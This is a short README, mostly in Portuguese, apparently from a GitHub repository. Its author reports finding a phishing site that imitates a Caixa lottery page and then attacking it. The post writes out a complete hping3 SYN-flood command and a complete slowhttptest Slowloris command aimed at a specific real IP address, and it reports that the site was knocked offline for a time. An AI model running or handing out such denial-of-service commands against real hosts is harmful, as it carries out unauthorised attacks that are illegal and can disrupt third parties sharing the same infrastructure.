# PreventingWebfraud
An event that required investigation!

Identifiquei um site tentando se passar por um site de sorteios da caixa (site do governo):

<img width="1094" height="703" alt="Screenshot 2025-12-28 135747" src="https://github.com/user-attachments/assets/9a9cecf9-579f-4f46-8486-fce7b5e4168e" />

Ao acessar o site recebo esta mensagem, identificando realmente que o site é um esquema de phishing:
<img width="700" height="404" alt="Screenshot 2025-12-28 140531" src="https://github.com/user-attachments/assets/b53eaf2d-4d34-4f97-93d0-f408ff2943fc" />

Utilizei:
sudo hping3 -S --flood -V -p 80 45.61.157.104
e
slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://45.61.157.104 -x 24 -p 3
O site caiu temporariamente.... 
<img width="1429" height="533" alt="Screenshot 2025-12-28 135705" src="https://github.com/user-attachments/assets/42b34e8b-b6f6-4564-8676-15cdddfbc8ec" />

mas retornou depois de algum tempo! Entendemos que deve ter algum load balancer ou waf realizando algum bloqueio!

